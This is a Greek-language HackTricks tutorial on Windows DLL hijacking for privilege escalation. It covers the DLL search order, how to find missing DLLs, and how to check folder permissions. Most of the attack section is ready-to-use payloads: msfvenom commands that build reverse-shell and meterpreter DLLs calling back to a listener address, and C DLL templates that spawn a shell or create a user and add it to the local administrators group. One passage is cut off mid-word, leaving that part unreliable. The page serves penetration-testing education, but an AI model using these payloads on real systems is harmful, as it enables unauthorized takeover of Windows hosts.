# Dll Hijacking

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Συμβουλή για bug bounty**: **Εγγραφείτε** στο **Intigriti**, μια προηγμένη **πλατφόρμα bug bounty δημιουργημένη από χάκερς, για χάκερς**! Γίνετε μέλος στο [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) σήμερα, και αρχίστε να κερδίζετε αμοιβές έως **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Βασικές Πληροφορίες

Η DLL Hijacking περιλαμβάνει τη χειραγώγηση μιας αξιόπιστης εφαρμογής για να φορτώσει μια κακόβουλη DLL. Αυτός ο όρος περιλαμβάνει αρκετές τακτικές όπως **DLL Spoofing, Injection, και Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα, επίτευξη διατήρησης και, λιγότερο συχνά, ανάδειξη προνομίων. Παρά την εστίαση στην ανάδειξη εδώ, η μέθοδος της απαγωγής παραμένει συνεπής σε όλους τους στόχους.

### Κοινές Τεχνικές

Χρησιμοποιούνται αρκετές μέθοδοι για την απαγωγή DLL, με την αποτελεσματικότητά τους να εξαρτάται από τη στρατηγική φόρτωσης DLL της εφαρμογής:

1. **Αντικατάσταση DLL**: Αντικατάσταση μιας γνήσιας DLL με μια κακόβουλη, προαιρετικά χρησιμοποιώντας DLL Proxying για να διατηρηθεί η λειτουργικότητα της αρχικής DLL.
2. **Απαγωγή Σειράς Αναζήτησης DLL**: Τοποθέτηση της κακόβουλης DLL σε ένα μονοπάτι αναζήτησης μπροστά από τη γνήσια, εκμεταλλευόμενη το πρότυπο αναζήτησης της εφαρμογής.
3. **Απαγωγή Phantom DLL**: Δημιουργία μιας κακόβουλης DLL για να φορτώσει μια εφαρμογή, νομίζοντας ότι είναι μια μη υπαρκτή απαιτούμενη DLL.
4. **Ανακατεύθυνση DLL**: Τροποποίηση παραμέτρων αναζήτησης όπως `%PATH%` ή αρχεία `.exe.manifest` / `.exe.local` για να κατευθύνει την εφαρμογή στην κακόβουλη DLL.
5. **Αντικατάσταση WinSxS DLL**: Αντικατάσταση της γνήσιας DLL με μια κακόβουλη αντίστοιχη στον κατάλογο WinSxS, μια μέθοδος συχνά συνδεδεμένη με την πλευρική φόρτωση DLL.
6. **Αναζήτηση Σχετικής Διαδρομής DLL**: Τοποθέτηση της κακόβουλης DLL σε έναν κατάλογο που ελέγχεται από τον χρήστη με την αντιγραφή της εφαρμογής, μοιάζοντας με τεχνικές εκτέλεσης διαμεσολάβησης δυαδικών αρχείων.

## Εύρεση λείπουσων Dlls

Ο πιο συνηθισμένος τρόπος να βρείτε λείπουσες Dlls μέσα σε ένα σύστημα είναι να εκτελέσετε το [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από τα sysinternals, **ρυθμίζοντας** τα **ακόλουθα 2 φίλτρα**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

και να εμφανίσετε μόνο τη **Δραστηριότητα του Συστήματος Αρχείων**:

![](<../../.gitbook/assets/image (314).png>)

Αν ψάχνετε για **λείπουσες dlls γενικά** αφήνετε αυτό να τρέχει για μερικά **δευτερόλεπτα**.\
Αν Ϩάζετε για μια **λείπουσα dll μέσα σε μια συγκεκριμένη εκτελέσιμη** πρέπει να ρυθμίσετε **ένα άλλο φίλτρο όπως "Όνομα Διεργασίας" "περιέχει" "\<όνομα εκτέλεσης>", να την εκτελέσετε και να σταματήσετε την καταγραφή συμβάντων**.

## Εκμετάλλευση λείπουσων Dlls

Για να αναδείξουμε προνόμια, η καλύτερη ευκαιρία που έχουμε είναι να **μπορούμε να γράψουμε μια dll που μια διαδικασία προνομίων θα προσπαθήσει να φορτώσει** σε κάποιο **μέρος όπου θα αναζητηθεί**. Έτσι, θα μπορούμε να **γράψουμε** μια dll σε ένα **φάκελο** όπου η **dll αναζητείται πριν** ο φάκελος όπου η **πρωτότυπη dll** είναι (περίεργη περίπτωση), ή θα μπορούμε να **γράψουμε σε κάποιο φάκελο όπου η dll θα αναζητηθεί** και η πρωτότυπη **dll δεν υπάρχει** σε κανένα φάκελο.

### Αναζήτηση Σειράς DLL

Μέσα στην [**τεκμηρίωση της Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **μπορείτε να βρείτε πώς φορτώνονται ειδικά οι Dlls**.

Οι **εφαρμογές Windows** ψάχνουν για DLL ακολουθώντας ένα σύνολο **προκαθορισμένων διαδρομών αναζήτησης**, τηρώντας μια συγκεκριμένη ακολουθία. Το πρόβλημα της απαγωγής DLL προκύπτει όταν μια επιβλαβής DLL τοποθετείται στον έναν από αυτούς τους καταλόγους, εξασφαλίζοντας ότι φορτώνεται πριν από την αυθεντική DLL. Μια λύση για να αποτραπεί αυτό είναι να διασφαλιστεί ότι η εφαρμογή χρησιμοποιεί απόλυτες διαδρομές όταν αναφέρεται στις DLL που απαιτεί.

Μπορείτε να δείτε τη **σειρά αναζήτησης DLL σε 32-bit** συστήματα παρακάτω:

1. Ο κατάλογος από τον οποίο φορτώθηκε η εφαρμογή.
2. Ο κατάλογος του συστήματος. Χρησιμοποιήστε τη [**συνάρτηση GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) για να λάβετε τη διαδρομή αυτού του καταλόγου.(_C:\Windows\System32_)
3. Ο κατάλογος 16-bit του συστήματος. Δεν υπάρχει συνάρτηση που να ανακτά τη διαδρομή αυτού του καταλόγου, αλλά αναζητείται. (_C:\Windows\System_)
4. Ο κατάλογος των Windows. Χρησιμοποιήστε τη [**συνάρτηση GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) για να λάβετε τη διαδρομή αυτού του καταλ
#### Εξαιρέσεις στη σειρά αναζήτησης dll από τα έγγραφα των Windows

Σύμφωνα με τα έγγραφα των Windows, υπάρχουν ορισμένες εξαιρέσεις στην κανονική σειρά αναζήτησης DLL:

- Όταν συναντηθεί μια **DLL που μοιράζεται το όνομά της με μια ήδη φορτωμένη στη μνήμη DLL**, το σύστημα παρακάμπτει τη συνήθη αναζήτηση. Αντίθετα, πραγματοποιεί έλεγχο για ανακατεύθυνση και ένα αρχείο μεταφοράς πριν προεπιλέξει την DLL που είναι ήδη στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν πραγματοποιεί αναζήτηση για την DLL**.
- Σε περιπτώσεις όπου η DLL αναγνωρίζεται ως **γνωστή DLL** για την τρέχουσα έκδοση των Windows, το σύστημα θα χρησιμοποιήσει την έκδοσή της της γνωστής DLL, μαζί με οποιεσδήποτε εξαρτώμενες DLLs της, **παραλείποντας τη διαδικασία αναζήτησης**. Το κλειδί του μητρώου **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει μια λίστα αυτών των γνωστών DLLs.
- Αν μια **DLL έχει εξαρτήσεις**, η αναζήτηση για αυτές τις εξαρτώμενες DLL πραγματοποιείται ως να υποδεικνύονταν μόνο από τα **ονόματα των μονάδων** τους, ανεξάρτητα από το εάν η αρχική DLL εντοπίστηκε μέσω πλήρους διαδρομής.

### Ανάδειξη Προνομίων

**Απαιτήσεις**:

- Εντοπίστε ένα διεργασία που λειτουργεί ή θα λειτουργήσει με **διαφορετικά προνόμια** (οριζόντια ή κάθετη μετακίνηση), η οποία **λείπει από μια DLL**.
- Βεβαιωθείτε ότι η **εγγραφή πρόσβασης** είναι διαθέσιμη για οποιονδήποτε **κατάλογο** στον οποίο θα γίνει **αναζήτηση για την DLL**. Αυτή η τοποθεσία μπορεί να είναι ο κατάλογος του εκτελέσιμου αρχείου ή ένας κατάλογος εντός της διαδρομής του συστήματος.

Ναι, οι προϋποθέσεις είναι περίπλοκες να βρεθούν καθώς **από προεπιλογή είναι λίγο παράξενο να βρείτε ένα προνομιούχο εκτελέσιμο που λείπει μια dll** και είναι ακόμα **πιο παράξενο να έχετε δικαιώματα εγγραφής σε έναν κατάλογο διαδρομής του συστήματος** (δεν μπορείτε από προεπιλογή). Ωστόσο, σε μη διαμορφωμένα περιβάλλοντα αυτό είναι δυνατό.\
Στην περίπτωση που είστε τυχεροί και πληρούνται οι προϋποθέσεις, μπορείτε να ελέγξετε το έργο [UACME](https://github.com/hfiref0x/UACME). Ακόμα κι αν ο **κύριος στόχος του έργου είναι η παράκαμψη του UAC**, εκεί μπορείτε να βρείτε ένα **PoC** ενός Dll hijaking για την έκδοση των Windows που μπορείτε να χρησιμοποιήσετε (πιθανότατα αλλάζοντας μόνο τη διαδρομή του καταλόγου όπου έχετε δικαιώματα εγγραφής).

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν κατάλογο** με την εντολή:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τις εισαγωγές ενός εκτελέσιμου αρχείου και τις εξαγωγές ενός dll με:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για οδηγίες για **κατάχρηση του Dll Hijacking για ανάδειξη δικαιωμάτων** με άδειες εγγραφής σε έναν φάκελο **System Path**, ελέγξτε:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Αυτοματοποιημένα εργαλεία

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)θα ελέγξει αν έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στον φάκελο συστήματος PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για την ανακάλυψη αυτής της ευπάθειας είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Παράδειγμα

Σε περίπτωση που βρείτε ένα εκμεταλλεύσιμο σενάριο, ένα από τα πιο σημαντικά πράγματα για να εκμεταλλευτείτε με επιτυχία θα είναι να **δημιουργήσετε ένα dll που εξάγει τουλάχιστον όλες τις λειτουργίες που το εκτελέσιμο θα εισάγει από αυτό**. Πάντως, σημειώστε ότι το Dll Hijacking είναι χρήσιμο για την [ανάδειξη από το επίπεδο Μεσαίας Ακεραιότητας στο Υψηλό **(παράκαμψη UAC)**](../authentication-credentials-uac-and-efs.md#uac) ή από [**Υψηλή Ακεραιότητα σε SYSTEM**](./#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα **πώς να δημιουργήσετε ένα έγκυρο dll** μέσα σε αυτή τη μελέτη Dll Hijacking που επικεντρώνεται στο dll hijacking για εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότητα** μπορείτε να βρείτε μερικούς **βασικούς κώδικες dll** που μπορεί να είναι χρήσιμοι ως **πρότυπα** ή για τη δημιουργία ενός **dll με μη απαιτούμενες λειτουργίες που εξάγονται**.

## **Δημιουργία και συνταγογράφηση Dlls**

### **Διαμεσολάβηση Dll**

Βασικά, ένα **Dll proxy** είναι ένα Dll ικανό να **εκτελέσει το κακόβουλο κώδικά σας όταν φορτώνεται** αλλά επίσης να **εκθέτει** και να **λειτουργεί** όπως **αναμένεται** με το **προώθηση όλων των κλήσεων στην πραγματική βιβλιοθήκη**.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε πραγματικά να **υποδείξετε ένα εκτελέσιμο και να επιλέξετε τη βιβλιοθήκη** που θέλετε να διαμεσολαβήσετε και να **δημιουργήσετε ένα διαμεσολαβημένο dll** ή να **υποδείξετε το Dll** και να **δημιουργήσετε ένα διαμεσολαβημένο dll**.
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Αποκτήστε έναν meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιουργία χρήστη (x86 δεν είδα μια x64 έκδοση):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Το δικό σας

Σημειώστε ότι σε πολλές περιπτώσεις το Dll που μεταγλωτίζετε πρέπει **να εξάγει πολλές συναρτήσεις** που θα φορτωθούν από τη διεργασία θύμα, αν αυτές οι συναρτήσεις δεν υπάρχουν το **δυαδικό αρχείο δεν θα μπορέσει να τις φορτώσει** και το **εκμετάλλευση θα αποτύχει**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Αναφορές

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Συμβουλή για αμοιβή ευρημάτων**: **Εγγραφείτε** στο **Intigriti**, μια προηγμένη **πλατφόρμα αμοιβής ευρημάτων δημιουργημένη από χάκερς, για χάκερς**! Γίνετε μέλος στο [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) σήμερα και αρχίστε να κερδίζετε αμοιβές έως και **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**Την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
